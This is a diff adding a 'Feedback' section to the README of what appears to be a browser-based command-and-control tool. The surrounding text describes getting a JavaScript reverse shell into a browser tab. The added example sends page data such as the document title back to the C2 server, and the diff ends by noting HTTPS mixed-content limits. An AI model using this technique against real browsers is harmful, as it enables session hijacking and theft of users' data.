@@ -20,6 +20,18 @@ const url = "http://localhost:8080/"; const r1 = await fetch(url + "get");const 
 
 now go to the console of the c2 server, you now have a javascript reverse shell into the current browser tab of the 
 
+## Feedback
+
+To get information back to the c2 server, you can use the *feedback* variable.
+
+for example to see the title of the current page:
+
+~~~
+(c2)> feedback = document.title
+~~~
+
+The title will then be printed next time the browser sends a request
+
 ## Challenges
 
 - HTTPS: most websites reject mixed content from http and https websites (except from localhost)
